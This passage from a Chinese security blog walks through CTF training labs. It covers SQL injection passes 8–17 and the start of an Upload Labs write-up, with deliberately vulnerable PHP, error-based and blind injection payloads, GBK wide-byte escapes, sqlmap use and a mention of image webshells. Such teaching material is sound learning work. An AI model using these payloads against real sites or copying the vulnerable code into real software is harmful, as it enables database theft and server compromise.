<h1 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$jc = $username.$password;</span><br><span class="line">$sql = <span class="string">'select *from user where username =\''</span>.$username.<span class="string">'\' and password=\''</span>.$password.<span class="string">'\''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/.*\'.*/'</span>,$jc)!== <span class="number">0</span>)&#123;<span class="keyword">die</span>(<span class="string">'为了网站安全性，禁止输入某些特定符号'</span>);&#125;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">//不想告诉你库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line">$Insql = <span class="string">"INSERT INTO refer (`refer`,`username`) VALUES ('$uagent','$uname')"</span>;</span><br><span class="line">$result1 = mysqli_query($conn,$Insql);</span><br><span class="line">print_r(mysqli_error($conn));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录'</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>就是head头中user-agent的插入换成了refer</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">Referer: 'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flag_h1) <span class="keyword">from</span> flag_head)),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725153252352.png" alt="image-20210725153252352"></p>
<h1 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) </span><br><span class="line">	&#123; </span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) </span><br><span class="line">	&#123; </span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123; </span><br><span class="line">		$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$ip = getip();</span><br><span class="line">$jc = $username.$password;</span><br><span class="line">$sql = <span class="string">'select *from user where username =\''</span>.$username.<span class="string">'\' and password=\''</span>.$password.<span class="string">'\''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/.*\'.*/'</span>,$jc)!== <span class="number">0</span>)&#123;<span class="keyword">die</span>(<span class="string">'为了网站安全性，禁止输入某些特定符号'</span>);&#125;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">//不想告诉你库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line">$Insql = <span class="string">"INSERT INTO ip (`ip`,`username`) VALUES ('$ip','$uname')"</span>;</span><br><span class="line">$result1 = mysqli_query($conn,$Insql);</span><br><span class="line">print_r(mysqli_error($conn));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录'</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>head头中记录我们访问ip的是X-FORWARDED-FOR，因为head头中有时是不显示的，我们自己加一个</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR: 'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flag_h1) <span class="keyword">from</span> flag_head)),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725153701899.png" alt="image-20210725153701899"></p>
<h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$news =<span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from news where id='</span>.$id;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$news = $row[<span class="string">'news'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($news!== <span class="string">''</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'有数据'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><p><strong>length函数：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">length(字符串内容)</span><br></pre></td></tr></table></figure></div>

<p>这个函数主要是用来测试字符串长度用，在盲注中是用来判断当前查询的字符串长度，例如数据库名，表名的长度。</p>
<p><strong>substr函数：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">SUBSTR(字符串内容,从哪截取,截取多长)</span><br></pre></td></tr></table></figure></div>

<p>用于分割字符串，将字符串分割成单个，配合ASCII码测试单个字符到底是什么字符。</p>
<p><strong>ascii函数：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ascii(填入字符)</span><br></pre></td></tr></table></figure></div>

<p>返回字符的ascii码，将字符转变为数字，将字符都转变为数字，可利用数字大小趋向的特性进行大小比较，从而迅速判断出准确的字符内容。</p>
</li>
</ul>
</blockquote>
<ul>
<li><strong>先用length判断数据库名</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725154941303.png" alt="image-20210725154941303"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725154916227.png" alt="image-20210725154916227"></p>
<blockquote>
<ul>
<li>再用substr从第一个字符的ascii码开始判断他为什么</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725155127027.png" alt="image-20210725155127027"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725155232219.png" alt="image-20210725155232219"></p>
<blockquote>
<ul>
<li>我拿起手中的burp来跑起，12字符快</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725155429654.png" alt="image-20210725155429654"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725155447310.png" alt="image-20210725155447310"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725155619456.png" alt="image-20210725155619456"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725160053468.png" alt="image-20210725160053468"></p>
<blockquote>
<ul>
<li>按从1到12的顺序把ascii码写下来准备解码</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">107 97 110 119 111 108 111 110 103 120 105 97</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>了解原理就好了，菜B的我还是sqlmap好用，暂时python脚本还不太会写</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725161831345.png" alt="image-20210725161831345"></p>
<h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$news =<span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from news where id="'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$news = $row[<span class="string">'news'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($news!== <span class="string">''</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'有数据'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>原理和上题一模一样就是需要加个单引号和末尾加个注释符%23也就是#</strong></li>
</ul>
</blockquote>
<h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">'select *from user where username =\''</span>.$username.<span class="string">'\' and password=\''</span>.$password.<span class="string">'\''</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'******'</span>); <span class="comment">//不想告诉你们库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录'</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">'账号密码错误'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>换了个传参方式，但是原理不变</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725162937391.png" alt="image-20210725162937391"></p>
<h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$news =<span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from news where id="'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$news = $row[<span class="string">'news'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'有数据'</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>时间盲注的判断方式也是布尔盲注的一种</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725163438518.png" alt="image-20210725163438518"></p>
<blockquote>
<ul>
<li><p>(1)、if(条件，满足条件的返回，不满足田间的返回)</p>
<p>(2)、sleep(X)：休眠X秒</p>
</li>
</ul>
</blockquote>
<ul>
<li>判断数据库的长度</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725170042202.png" alt="image-20210725170042202"></p>
<ul>
<li>判断数据库的值用substr和ascii</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&quot; and if(ascii(substr(database(),1,1))&gt;1,sleep(1),1)%23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725170337323.png" alt="image-20210725170337323"></p>
<ul>
<li>抓包，然后和布尔盲注是一样的操作，理解原理就行</li>
</ul>
<h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$news =<span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from news where id=(\''</span>.$id.<span class="string">'\')'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$news = $row[<span class="string">'news'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'有数据'</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>和上题一模一样，除了”双引号换成’)</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;inject2.lab.aqlab.cn:81&#x2F;Pass-14&#x2F;index.php?id&#x3D;1&#39;) and if(ascii(substr(database(),1,1))&gt;1,sleep(5),1)%23</span><br></pre></td></tr></table></figure></div>

<h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">@$sql = <span class="string">'select *from user where id=\''</span>.$id.<span class="string">'\''</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">mysqli_query($conn,<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>可以发现有addslashes函数导致我们输入的一些单双引号前面加了个右斜线\，由于右斜线的url编码是%5c，%df%5c会组成一个特殊汉字来进行逃逸，</strong></li>
<li><strong>因为GBK编码默认两个字符为一个汉字, 我们可以通过输入宽字符%df使反斜杠和这个%df形成一个汉字,这样后面的单引号就不会被转义而达到逃逸的效果</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725171608951.png" alt="image-20210725171608951"></p>
<ul>
<li>输入<strong>%df</strong>逃逸斜线</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725171819994.png" alt="image-20210725171818342"></p>
<ul>
<li><strong>接着判断字段长度、等拿flag和第一题一样</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%df' union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725171952143.png" alt="image-20210725171952143"></p>
<h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">@$sql = <span class="string">'select *from user where id=("'</span>.$id.<span class="string">'")'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">mysqli_query($conn,<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>和上题区别不大，就是加了“)的形式</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-16/index.php?id=1%df") union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = addslashes($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="string">'select *from user where username =(\''</span>.$username.<span class="string">'\') and password=(\''</span>.$password.<span class="string">'\')'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'******'</span>); <span class="comment">//不想告诉你们库名</span></span><br><span class="line">mysqli_query($conn,<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录'</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">'账号密码错误'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>这题是个盲注，但是我还是说一下，post传参由于没有url解码，所以宽字节注入得换个参数，比如“汉”这个字和右下划线组成一个汉字也是可以逃逸的。</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>成功逃逸</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725172842136.png" alt="image-20210725172842136"></p>
<ul>
<li><strong>因为是盲注所以嘿嘿，抓包，存123.txt，注意：一定要抓我们自己成功构造登陆的形式加*来让sqlmap跑，不然可能跑不出来</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725173245278.png" alt="image-20210725173245278"></p>
<ul>
<li>sqlmap跑的形式</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725173306539.png" alt="image-20210725173306539"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725173317389.png" alt="image-20210725173317389"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725174439030.png" alt="image-20210725174439030"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>封神台</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】Upload Labs wp</title>
    <url>/posts/68.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场upload-labs，练练手！</li>
<li>环境：<a href="http://59.63.200.79:8016/" target="_blank" rel="noopener">http://59.63.200.79:8016/</a></li>
</ul>
</blockquote>
<h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>没有对文件进行限制抓包改，需要注意一点的就是图片马多生成几个试吧，有的图片不太行</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210721181216739.png" alt="image-20210721181216739"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210721182048669.png" alt="image-20210721182048669"></p>
</blockquote>
<h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>只限制了content-type，并没有限制你改后缀名，和上题一样做法</strong></li>
</ul>
</blockquote>
<h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR. <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span 